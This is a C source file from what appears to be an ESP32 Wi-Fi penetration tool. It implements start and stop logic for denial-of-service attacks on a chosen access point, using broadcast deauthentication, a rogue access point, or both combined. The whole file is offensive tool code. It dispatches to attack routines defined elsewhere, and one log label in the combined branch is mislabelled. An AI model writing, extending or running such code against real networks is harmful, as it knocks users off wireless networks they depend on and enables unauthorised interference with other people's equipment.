/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements DoS attacks using deauthentication methods
 *
 * @date Update 2023-05-07
 * @note Updated by Zheng Lin Lei
 * @note Github: https://github.com/ZhengLinLei
 */
#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"

static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;

bool attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack...");
    if (attack_config == NULL || attack_config->ap_record == NULL ||
        attack_config->ap_record->primary == 0 ||
        attack_config->method > ATTACK_DOS_METHOD_COMBINE_ALL) {
        ESP_LOGE(TAG, "Invalid DoS attack configuration");
        return false;
    }
    method = attack_config->method;
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_BROADCAST");
            return attack_method_broadcast(attack_config->ap_record, 100);
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            return attack_method_rogueap(attack_config->ap_record);
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            if (!attack_method_broadcast(attack_config->ap_record, 100)) return false;
            return attack_method_rogueap(attack_config->ap_record);
        default:
            ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
            return false;
    }
    return true;
}

bool attack_dos_stop(void) {
    bool ok = true;
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            break;
        default:
            break;
    }
    ok = wifictl_mgmt_ap_restore() && ok;
    method = -1;
    ESP_LOGI(TAG, "DoS attack stopped");
    return ok;
}
